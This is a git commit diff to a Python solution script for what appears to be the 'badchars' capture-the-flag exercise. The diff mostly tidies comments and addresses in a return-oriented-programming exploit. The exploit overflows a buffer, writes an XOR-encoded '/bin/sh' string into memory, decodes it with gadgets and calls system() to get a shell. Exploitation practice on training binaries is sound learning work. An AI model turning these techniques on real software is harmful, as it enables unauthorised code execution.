9b21893a3b7ed55ffcb7ca69377d94a33a692cb7
micky <mickyhall35@gmail.com>
2020-07-09 21:36:47 -0700

    Started writeups

--- badchars/solution.py
+++ badchars/solution.py
@@ -16,19 +16,19 @@ binsh += "\x00"
 # Where we will be wrinting our string to
 data = 0x601000
 
-# for writing to data memory
-pop_12_13_ret = p64(0x0000000000400b3b)
-mov_a13_12 = p64(0x0000000000400b34)
+# For writing to data memory
+pop_12_13_ret = p64(0x400b3b)
+mov_a13_12 = p64(0x400b34)
 
-# for xoring data
-xor_a15_15 = p64(0x0000000000400b30)
-pop15 = p64(0x0000000000400b42)
-pop_14_15 = p64(0x0000000000400b40)
+# For xoring data
+xor_a15_14 = p64(0x400b30)
+pop15 = p64(0x400b42)
+pop_14_15 = p64(0x400b40)
 x_or = p64(key)
 
-# for calling system
-pop_rdi_ret = p64(0x0000000000400b39)
-system = p64(0x00000000004009e8)
+# For calling system
+pop_rdi_ret = p64(0x400b39)
+system = p64(0x4009e8)
 
 # Gets us onto the stack proper
 payload = "A"*40
@@ -39,10 +39,11 @@ payload += pop_12_13_ret + binsh + p64(data) + mov_a13_12
 # Xor the string in data
 payload += pop_14_15 + x_or + p64(data)
 for i in range(len(binsh)-1):
-    payload += pop15 + p64(data+i) + xor_a15_15
+    payload += pop15 + p64(data+i) + xor_a15_14
 
-#call system with our string in data as the param
+# Call system with our string in data as the param
 payload += pop_rdi_ret + p64(data)+ system
 
+# Win
 pr.sendline(payload)
 pr.interactive()
